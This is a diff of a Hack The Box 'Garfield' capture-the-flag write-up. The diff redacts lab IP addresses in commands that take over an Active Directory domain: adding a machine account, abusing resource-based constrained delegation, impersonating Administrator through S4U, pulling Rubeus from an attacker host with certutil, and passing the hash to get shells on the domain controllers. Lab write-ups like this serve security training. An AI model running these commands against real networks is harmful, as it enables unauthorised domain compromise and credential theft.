@@ -398,7 +398,7 @@ bloodyAD --host garfield.htb -u l.wilson_adm -p 'Password456!' add groupMember "
 To facilitate the delegation attack, a new attacker-controlled machine account (`z0n$`) was provisioned within the domain. The `impacket-addcomputer` module was used for this action.
 
 ```bash
-impacket-addcomputer -computer-name 'z0n$' -computer-pass 'Password456!' -dc-ip 10.129.23.120 garfield.htb/l.wilson_adm:Password456!
+impacket-addcomputer -computer-name 'z0n$' -computer-pass 'Password456!' -dc-ip 10.XXX.XXX.XXX garfield.htb/l.wilson_adm:Password456!
 ```
 
 ![Garfield](htb_Garfiled_compFakeadd.png)
@@ -407,7 +407,7 @@ impacket-addcomputer -computer-name 'z0n$' -computer-pass 'Password456!' -dc-ip 
 With the controlled machine account established, `impacket-rbcd` was utilized to modify the Active Directory schema. This granted `z0n$` the authority to act on behalf of other identities against the `RODC01$` machine account.
 
 ```bash
-impacket-rbcd -action write -delegate-from 'z0n$' -delegate-to 'RODC01$' -dc-ip 10.129.23.120 garfield.htb/l.wilson_adm:Password456!
+impacket-rbcd -action write -delegate-from 'z0n$' -delegate-to 'RODC01$' -dc-ip 10.XXX.XXX.XXX garfield.htb/l.wilson_adm:Password456!
 ```
 *Output snippet:*
 ```text
@@ -424,7 +424,7 @@ impacket-rbcd -action write -delegate-from 'z0n$' -delegate-to 'RODC01$' -dc-ip 
 Leveraging the newly configured RBCD rights, `impacket-getST` was executed to perform the Kerberos protocol extensions: Service for User to Self (S4U2self) and Service for User to Proxy (S4U2proxy). This generated a valid Kerberos Service Ticket (ST) for the `cifs` service on `RODC01`, successfully impersonating the `Administrator` account.
 
 ```bash
-impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -dc-ip 10.129.23.120 garfield.htb/'z0n$':'Password456!'
+impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -dc-ip 10.XXX.XXX.XXX garfield.htb/'z0n$':'Password456!'
 ```
 
 
@@ -451,7 +451,7 @@ With the Kerberos Service Ticket successfully generated and cached from the RBCD
 
 **Command Executed:**
 ```bash
-impacket-wmiexec -k -no-pass -dc-ip 10.129.23.120 garfield.htb/Administrator@RODC01.garfield.htb
+impacket-wmiexec -k -no-pass -dc-ip 10.XXX.XXX.XXX garfield.htb/Administrator@RODC01.garfield.htb
 ```
 
 ### Proof of Concept
@@ -525,7 +525,7 @@ unset KRB5CCNAME
 export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
 
 # Execute PsExec utilizing the cached Kerberos ticket
-/usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.129.23.120 garfield.htb/Administrator@rodc01.garfield.htb
+/usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.XXX.XXX.XXX garfield.htb/Administrator@rodc01.garfield.htb
 ```
 
 **Proof of Concept:**
@@ -580,7 +580,7 @@ To bypass this, an on-target approach utilizing `Rubeus` and Active Directory re
 `Rubeus.exe` was transferred to the compromised `RODC01` host using the `certutil` binary.
 
 ```cmd
-C:\> certutil -urlcache -split -f http://10.10.14.115:8000/Rubeus.exe C:\Windows\Temp\Rubeus.exe
+C:\> certutil -urlcache -split -f http://10.10.XXX.XXXX:8000/Rubeus.exe C:\Windows\Temp\Rubeus.exe
 ```
 
 **2. Modifying Password Replication Policies**
@@ -616,10 +616,10 @@ The forged `.kirbi` TGT was then utilized to request a Ticket Granting Service (
 With the Domain Administrator's NTLM hash and a valid Base64-encoded `.kirbi` ticket obtained, two distinct paths were executed to verify total domain compromise.
 
 ### Method A: Pass-The-Hash (Evil-WinRM)
-The extracted NTLM hash was used to establish a direct WinRM session to the primary Domain Controller (`10.129.23.139`) and capture the final flag.
+The extracted NTLM hash was used to establish a direct WinRM session to the primary Domain Controller (`10.XXX.XXX.XXX`) and capture the final flag.
 
 ```bash
-evil-winrm -i 10.129.23.139 -u Administrator -H EE238FXXXXXXXXXXXXXXXXXXXXXXXXXX
+evil-winrm -i 10.XXX.XXX.XXX -u Administrator -H EE238FXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 **Proof of Concept:**
@@ -650,7 +650,7 @@ impacket-ticketConverter admin.kirbi admin.ccache
 **2. Shell Execution:**
 ```bash
 export KRB5CCNAME=admin.ccache
-impacket-wmiexec -k -no-pass -dc-ip 10.129.23.139 garfield.htb/Administrator@DC01.garfield.htb
+impacket-wmiexec -k -no-pass -dc-ip 10.XXX.XXX.XXX garfield.htb/Administrator@DC01.garfield.htb
 ```
 
 **Proof of Concept:**
